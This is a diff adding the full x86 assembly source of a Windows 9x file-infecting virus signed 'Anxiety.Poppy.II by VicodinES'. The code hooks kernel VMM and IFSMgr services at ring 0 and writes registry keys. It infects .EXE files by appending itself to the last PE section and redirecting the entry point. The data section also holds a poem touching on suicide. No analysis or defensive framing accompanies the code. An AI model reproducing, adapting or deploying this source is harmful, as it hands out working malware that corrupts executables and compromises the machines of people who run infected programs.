@@ -1,0 +1,486 @@
+;               Anxiety.Poppy.II virus   
+             
+                .386
+                .model  tiny
+                .code
+@               equ     00402002h-offset vir_start
+                org     100h
+start:
+vir_start:      mov     EBP,0
+delta_ofs       =       dword ptr $-4
+                sub     DX,DX
+                mov     EDI,0C0001000h
+                mov     EAX,0FFh
+                mov     ECX,0FFFFFFFFh
+loc_2:          repne   scasb
+                mov     EBX,ECX
+                or      ECX,ECX
+                jz      loc_3
+                cmp     EDI,0C000C000h
+                jae     short loc_3
+                nop
+                nop
+                nop
+                nop
+                repe    scasb
+                or      ECX,ECX
+                jz      short loc_3
+                nop
+                nop
+                nop
+                nop
+                sub     EBX,ECX
+                cmp     EBX,vir_mem_size
+                jb      loc_2
+                sub     EDI,EBX
+                mov     EAX,0C000157Fh
+                mov     EBX,ds:[EAX]    ; ebx = first DDB (VMM)
+                cmp     dword ptr DS:[EBX+0Ch],' MMV' ; check DDB name for VMM
+                jne     short loc_3
+                nop
+                nop
+                nop
+                nop
+                mov     EBX,ds:[EBX+30h]        ; get Service Table
+                lea     EAX,ds:[EBX+0fh*4]
+                                ; Schedule_VM_Event service number = 0fh
+                mov     ss:Schedule_VM_EventPtr[EBP]+@,EAX
+                                ; now! eax = ServiceTable + 0fh * 4
+                mov     EAX,ds:[EAX]    ; get Schedule_VM_Event address
+                mov     ss:oldSchedule_VM_EventIP[EBP]+@,EAX    ; backup!
+                lea     EAX,ds:Schedule_VM_Event_Hook-vir_start[EDI]
+                mov     ds:[EBX+3Ch],EAX ; modify to our hook
+                                ; hooked Schedule_VM_Event (VMM)
+                lea     ESI,ss:vir_start[EBP]+@
+                mov     ECX,vir_size
+                mov     ss:delta1[EBP]+@,EDI
+                sub     dword ptr ss:delta1[EBP]+@,offset vir_start+@
+
+                mov     ss:delta2[EBP]+@,EDI
+                sub     dword ptr ss:delta2[EBP]+@,offset vir_start+@
+
+                rep     movsb
+
+loc_3:          mov     ss:host_cs[EBP]+@,CS
+                jmp     $+2
+                db      0EAh
+host_ip         dd      ?
+host_cs         dw      ?
+
+
+Schedule_VM_Event_Hook:
+                pushad
+                mov     EDX,0
+delta1          =       dword ptr $-4
+                mov     EAX,ds:oldSchedule_VM_EventIP[EDX]+@ ; get old Schedule_VM_Event
+                mov     ds:[0FFFFFFFFh],EAX     ; restore
+Schedule_VM_EventPtr =  dword ptr $-4
+                mov     ds:oldSchedule_VM_EventCS[EDX]+@,CS
+                call    HookFileIO
+                popad
+                db      0EAh
+oldSchedule_VM_EventIP dd ?
+oldSchedule_VM_EventCS dw ?
+
+
+HookFileIO:     lea     EAX,ds:FileSystemApiHook[EDX]+@ ; eax = ifsmgr hooker
+                push    EDX     ; save DX
+
+                push    EAX     ; push eax for VxD call
+VxDCall1        =       $
+                int     20h     ; VXDCALL IFSMgr_InstallFileSystemApiHook
+                dd      00400067h       ; return eax = c5175808??
+
+                add     ESP,4
+                pop     EDX
+                mov     ds:oldFileSystemApiHookofs[EDX]+@,EAX  ; save to data1
+                push    EDX
+                mov     EAX,0D500h
+                sub     ECX,ECX
+                mov     EBX,2
+                mov     EDX,12h
+VxDFileIO16     =       $
+                int     20h     ; VXDCALL IFSMgr_Ring0_FileIO
+                dd      00400032h
+                pop     EDX
+                jc      short loc_ret_5
+                nop
+                nop
+                nop
+                nop
+VxDFileIO17     =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                mov     EAX,0D700h
+VxDFileIO18     =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                pop     EDX
+VxDCall2        =       $
+                int     20h     ; VXDCall _RegCreateKey
+                dd      0001014ah
+                add     ESP,0Ch
+                pop     EDX
+VxDCall3        =       $
+                int     20h     ; VXDCall _RegSetValueEx
+                dd      00010152h
+                add     ESP,18h
+                pop     EDX
+                mov     EAX,ds:unknow1[EDX]+@
+                push    EAX
+VxDCall4        =       $
+                int     20h     ; VXDCall _RegCloseKey
+                dd      00010149h
+                add     ESP,4
+loc_ret_5:
+                ret
+
+
+FileSystemApiHook:                                                              ;* No entry point to code
+                push    EBP
+                mov     EBP,ESP
+                sub     ESP,20h
+                push    EBX
+                push    ESI
+                push    EDI
+                mov     EDI,0           ; get ofs
+delta2          =       dword ptr $-4
+                cmp     byte ptr (ds:enter_flag[EDI]+@),1     ; enter flag
+                je      loc_10
+                cmp     dword ptr ss:[EBP+0Ch],24h
+                jne     loc_10
+                mov     byte ptr (ds:enter_flag[EDI]+@),1     ; set enter flag
+                pushad
+                lea     ESI,ds:buffer[EDI]+@
+                mov     EAX,ss:[EBP+10h]
+                cmp     AL,0FFh
+                je      short loc_6
+                nop
+                nop
+                nop
+                nop
+                add     AL,40h                  ; add al,'A'-1
+                mov     ds:[ESI],AL
+                inc     ESI
+                mov     byte ptr ds:[ESI],3Ah      ; ':'
+                inc     ESI
+loc_6:
+                sub     EAX,EAX
+                mov     ds:SizeOfOptionalHeader[EDI]+@,EAX
+                mov     ds:NumberOfSections[EDI]+@,EAX
+                push    EAX
+                mov     EAX,0FFh
+                push    EAX
+                mov     EBX,ss:[EBP+1Ch]
+                mov     EAX,ds:[EBX+0Ch]
+                add     EAX,4
+                push    EAX
+                mov     EAX,ESI
+                push    EAX
+VxDCall5        =       $
+                int     20h     ; VXDCall UniToBCSPath
+                dd      00400041h
+                add     ESP,10h
+                add     ESI,EAX
+                mov     byte ptr ds:[ESI],0
+                cmp     dword ptr ds:[ESI-4],"EXE." ; cmp [esi-4],"EXE."
+                jne     loc_9
+                mov     EAX,0D500h              ; open file
+                sub     ECX,ECX
+                lea     ESI,ds:buffer[EDI]+@ ; si -> file name
+                mov     EBX,2
+                mov     EDX,1
+VxDFileIO1      =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                jc      loc_9
+
+                mov     EBX,EAX         ; ebx = file handle
+                mov     ECX,4           ; read 4 bytes
+                mov     EDX,3Ch         ; edx = seek
+                mov     EAX,0D600h      ; read file
+                lea     ESI,ds:e_ifanew[EDI]+@  ; esi -> buf
+VxDFileIO2      =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                ; read PE header offset
+
+                mov     ECX,4
+                mov     EDX,ds:e_ifanew[EDI]+@
+                mov     EAX,0D600h
+                lea     ESI,ds:buffer[EDI]+@
+VxDFileIO3      =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                ; read "PE" from PE header
+
+                cmp     dword ptr ds:[ESI],'EP'   ; 4550h = "PE"
+                jne     loc_8
+                mov     ECX,4
+                mov     EDX,ds:e_ifanew[EDI]+@  ; get PE Header ofs
+                add     EDX,34h                 ; point to ImageBase
+                mov     EAX,0D600h
+                lea     ESI,ds:ImageBase[EDI]+@
+VxDFileIO4      =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                ; read ImageBase
+
+                mov     ECX,4
+                mov     EDX,ds:e_ifanew[EDI]+@
+                add     EDX,28h                 ; point to AddressOfEntryPoint
+                mov     EAX,0D600h
+                lea     ESI,ds:host_ip[EDI]+@
+VxDFileIO5      =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                ; read AddressOfEntryPoint for host ip
+
+                mov     EAX,ds:ImageBase[EDI]+@  ; eax = ImageBase
+                add     ds:host_ip[EDI]+@,EAX  ; host_ip += ImageBase
+
+                mov     ECX,4
+                mov     EDX,ds:e_ifanew[EDI]+@
+                add     EDX,38h                         ; point to SectionAlignment
+                lea     ESI,ds:SectionAlignment[EDI]+@
+                mov     EAX,0D600h
+VxDFileIO6      =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                ; read SectionAlignment
+
+                mov     ECX,4
+                mov     EDX,ds:e_ifanew[EDI]+@
+                add     EDX,3Ch         ; point to FileAligment
+                lea     ESI,ds:FileAligment[EDI]+@
+                mov     EAX,0D600h
+VxDFileIO7      =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                ; read FileAligment
+
+                mov     ECX,2
+                mov     EDX,ds:e_ifanew[EDI]+@
+                add     EDX,14h         ; point to SizeOfOptionalHeader
+                mov     EAX,0D600h
+                lea     ESI,ds:SizeOfOptionalHeader[EDI]+@
+VxDFileIO8      =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                ; read SizeOfOptionalHeader (word)
+
+                mov     ECX,2
+                mov     EDX,ds:e_ifanew[EDI]+@
+                add     EDX,6           ; NumberOfSections
+                mov     EAX,0D600h
+                lea     ESI,ds:NumberOfSections[EDI]+@
+VxDFileIO9      =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                ; read NumberOfSections (word)
+
+                mov     EAX,ds:[ESI]       ; eax = NumberOfSections
+                mov     ECX,28h ; size of each section table (28h)
+                mul     ECX
+                mov     EDX,ds:SizeOfOptionalHeader[EDI]+@
+                add     EDX,EAX
+                sub     EDX,ECX
+                add     EDX,ds:e_ifanew[EDI]+@
+                add     EDX,18h ; edx point to last section table
+                mov     ds:LastSectionTbl[EDI]+@,EDX
+                mov     EAX,0D600h
+                lea     ESI,ds:SectionTbl[EDI]+@
+VxDFileIO10     =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                ; read section table
+
+                cmp     byte ptr (ds:SectionName[EDI+7]+@),0FFh  ; compare if already infected
+                je      loc_8
+
+                mov     byte ptr (ds:SectionName[EDI+7]+@),0FFh  ; mark a infect sign
+                mov     EAX,ds:VirtualSize[EDI]+@  ; VirtualSize
+                add     EAX,ds:VirtualAddress[EDI]+@  ; eax += VirtualAddress
+                                                        ; (calculate end of this section)
+                mov     ds:NewAddressOfEntryPoint[EDI]+@,EAX
+                add     EAX,ds:ImageBase[EDI]+@
+                sub     EAX,offset vir_start+@        ; calculate delta ofs
+                mov     ds:delta_ofs[EDI]+@,EAX
+                sub     EDX,EDX
+                mov     EAX,vir_size            ; size of virus
+                mov     ECX,ds:FileAligment[EDI]+@
+                div     ECX
+                inc     EAX
+                mul     ECX
+                push    EAX             ; eax = aligment size of virus
+                add     EAX,ds:VirtualSize[EDI]+@  ; eax += VirtualSize
+                mov     ds:SizeOfRawData[EDI]+@,EAX  ; SizeOfRawData = eax
+                sub     EDX,EDX
+                mov     EAX,vir_size
+                mov     ECX,ds:SectionAlignment[EDI]+@
+                div     ECX
+                inc     EAX
+                mul     ECX
+                push    EAX
+                add     EAX,ds:VirtualSize[EDI]+@  ; eax += VirtualSize
+                mov     ds:VirtualSize[EDI]+@,EAX  ; VirtualSize = eax
+                mov     EAX,ds:VirtualSize[EDI]+@
+                add     EAX,ds:VirtualAddress[EDI]+@  ; eax += VirtualAddress
+                mov     ds:NewSizeOfImage[EDI]+@,EAX  ; new SizeOfImage
+                mov     dword ptr ds:Characteristics[EDI]+@,0E0000040h   ; modify Characteristics
+                                                ; attribute of section
+                                                ;   writeable
+                                                ;   readable
+                                                ;   executable
+                                                ;   include init data
+                mov     ECX,4
+                mov     EDX,ds:e_ifanew[EDI]+@
+                add     EDX,50h                 ; point to SizeOfImage
+                mov     EAX,0D601h
+                lea     ESI,ds:NewSizeOfImage[EDI]+@
+VxDFileIO11     =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                ; write SizeOfImage
+
+                mov     ECX,28h
+                mov     EDX,ds:LastSectionTbl[EDI]+@ ; seek to last section ofs
+                mov     EAX,0D601h
+                lea     ESI,ds:SectionTbl[EDI]+@ ; point to last section
+VxDFileIO12     =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                ; write last section
+
+                mov     CX,40h
+                mov     dword ptr ds:VxDCall1[EDI]+@,6720CDh
+                mov     ds:VxDCall1[EDI+4]+@,CX
+                mov     dword ptr ds:VxDCall5[EDI]+@,4120CDh
+                mov     ds:VxDCall5[EDI+4]+@,CX
+                mov     CX,1
+                mov     dword ptr ds:VxDCall2[EDI]+@,14A20CDh
+                mov     ds:VxDCall2[EDI+4]+@,CX
+                mov     dword ptr ds:VxDCall3[EDI]+@,15220CDh
+                mov     ds:VxDCall3[EDI+4]+@,CX
+                mov     dword ptr ds:VxDCall4[EDI]+@,14920CDh
+                mov     ds:VxDCall4[EDI+4]+@,CX
+
+                lea     ESI,ds:VxDCallTbl[EDI]+@
+                mov     ECX,VxDCallTblSize/4
+locloop_7:
+                lodsd
+                add     EAX,EDI
+                mov     dword ptr ds:[EAX],3220CDh
+                mov     word ptr ds:[EAX+4],40h
+                loopd   locloop_7
+
+                pop     ECX
+                mov     EAX,0D601h
+                mov     EDX,ds:VirtualSize[EDI]+@  ; edx = VirtualSize
+                add     EDX,ds:PointerToRawData[EDI]+@  ; edx += PointToRawData
+                                                ; (end of section)
+                sub     EDX,ECX ; edx = begin of our place on file
+                pop     ECX     ; virus size align by FileAligment
+                lea     ESI,ds:vir_start[EDI]+@
+VxDFileIO13     =       $
+                int     20h
+                dd      00400032h       ; VXDCall IFSMgr_Ring0_FileIO
+                ; write our body
+
+                mov     ECX,4
+                mov     EDX,ds:e_ifanew[EDI]+@
+                add     EDX,28h
+                mov     EAX,0D601h
+                lea     ESI,ds:NewAddressOfEntryPoint[EDI]+@  ; point to AddressOfEntryPoint
+VxDFileIO14     =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+                ; modify AddressOfEntryPoint
+
+loc_8:
+                mov     EAX,0D700h
+VxDFileIO15     =       $
+                int     20h     ; VXDCall IFSMgr_Ring0_FileIO
+                dd      00400032h
+loc_9:
+                popad
+                mov     byte ptr (ds:enter_flag[EDI]+@),0     ; enter flag
+loc_10:
+                mov     EAX,ss:[EBP+1Ch]
+                push    EAX
+                mov     EAX,ss:[EBP+18h]
+                push    EAX
+                mov     EAX,ss:[EBP+14h]
+                push    EAX
+                mov     EAX,ss:[EBP+10h]
+                push    EAX
+                mov     EAX,ss:[EBP+0Ch]
+                push    EAX
+                mov     EAX,ss:[EBP+8]
+                push    EAX
+                mov     EAX,0
+oldFileSystemApiHookofs = dword ptr $-4
+                call    ds:[EAX]        ; [c5175808] = ??
+                add     ESP,18h
+                pop     EDI
+                pop     ESI
+                pop     EBX
+                leave
+                ret
+
+                db      'Anxiety.Poppy.II by VicodinES', 0
+                db      '...feel the pain, mine not yours!'
+
+VxDCallTbl      dd      VxDFileIO1+@, VxDFileIO2+@, VxDFileIO3+@
+                dd      VxDFileIO4+@, VxDFileIO5+@, VxDFileIO6+@
+                dd      VxDFileIO7+@, VxDFileIO8+@, VxDFileIO9+@
+                dd      VxDFileIO10+@,VxDFileIO11+@,VxDFileIO12+@
+                dd      VxDFileIO13+@,VxDFileIO14+@,VxDFileIO15+@
+                dd      VxDFileIO16+@,VxDFileIO17+@,VxDFileIO18+@
+VxDCallTblSize  =       $-offset VxDCallTbl
+
+        db      " | all alone and I don't understand "
+        db      ' | a cry for help and no one answers'
+        db      ' | will I last for more than a week'
+        db      ' | will I taste the gunpowder'
+        db      ' |can I end it all and make it easy '
+        db      ' | is it sick to ask'
+        db      ' | is it safe to cry'
+        db      ' | will I be gone soon'
+        db      ' | will I last'
+        db      ' | will you care'
+        db      ' | will I?'
+        db      " | -- | if you don't hear from me in a while"
+        db      ' - say a prayer for me because I have left, never to return.'
+        db      ' | -- | peaceful goodnight, hopefully...'
+        db      ' | Vic'
+        db      ' | -- | '
+vir_size        =       $-offset vir_start
+
+enter_flag              db      ?
+unknow1                 dd      ?
+
+NewAddressOfEntryPoint  dd      ?
+e_ifanew                dd      ?
+ImageBase               dd      ?
+SectionAlignment        dd      ?
+FileAligment            dd      ?
+SizeOfOptionalHeader    dd      ?
+NumberOfSections        dd      ?
+LastSectionTbl          dd      ?
+NewSizeOfImage          dd      ?
+
+SectionTbl              =       $
+SectionName             db      8 dup(?)
+VirtualSize             dd      ?
+VirtualAddress          dd      ?
+SizeOfRawData           dd      ?
+PointerToRawData        dd      ?
+                        dd      3 dup(?)
+Characteristics         dd      ?
+
+buffer                  db      175 dup(?)
+vir_mem_size            equ     $-offset vir_start
+
+                end     start
+
